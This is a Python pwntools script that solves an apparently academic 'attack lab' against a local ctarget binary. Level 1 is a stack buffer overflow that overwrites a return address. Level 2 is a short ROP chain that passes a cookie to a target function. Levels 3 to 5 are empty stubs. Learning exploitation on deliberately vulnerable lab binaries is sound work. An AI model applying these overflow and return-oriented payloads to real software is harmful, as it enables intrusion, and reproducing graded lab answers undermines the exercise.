import os
from typing import Callable

import click
from pwn import process, p64

DIRECTORY = './answers/'
BUF_SIZE = 56

def check_level(level: int) -> bool: return level in [1, 2, 3, 4, 5]

def get_solution_func(level: int) -> Callable[[bool], None]:
    match level:
        case 1:
            return solve_level_1
        case 2:
            return solve_level_2
        case 3:
            return solve_level_3
        case 4:
            return solve_level_4
        case 5:
            return solve_level_5
        case _:
            raise ValueError("Invalid level")
        
def print_solution(level: int, solution: bytes) -> None:
    if not os.path.exists(DIRECTORY):
        os.makedirs(DIRECTORY)
    
    path = os.path.join(DIRECTORY, f'level_{level}_solution')
    with open(path, 'wb') as f:
        f.write(solution)

def solve_ctarget(solution: bytes, flag: bool, level: int) -> None:
    if flag:
        print_solution(level, solution)
        return
    
    proc = process(['./ctarget', '-q'])
    proc.sendline(solution)
    proc.interactive()
        
def solve_level_1(flag: bool) -> None:
    solution = (
        b"a" * BUF_SIZE # padding
        + p64(0x4017fc) # touch 1
    )
    solve_ctarget(solution, flag, 1)

def solve_level_2(flag: bool) -> None:
    solution = (
        b"a" * BUF_SIZE # padding
        + p64(0x4028f0) # pop rdi; ret
        + p64(0x11560ebd) # cookie value
        + p64(0x401828) # touch 2
    )
    solve_ctarget(solution, flag, 2)

def solve_level_3(flag: bool) -> None:
    pass

def solve_level_4(flag: bool) -> None:
    pass

def solve_level_5(flag: bool) -> None:
    pass

@click.command()
@click.option("--level", "-l", help="level to solve", required=True, type=int)
@click.option("--output", "-o", is_flag=True, help="print the solution instead of executing it", type=bool, default=False)
def main(level: int, output: bool):
    print(level, output)
    if not check_level(level):
        click.echo(f"Invalid level: {level}")
        return

    binary_path = get_solution_func(level)
    binary_path(output)

if __name__ == "__main__":
    main()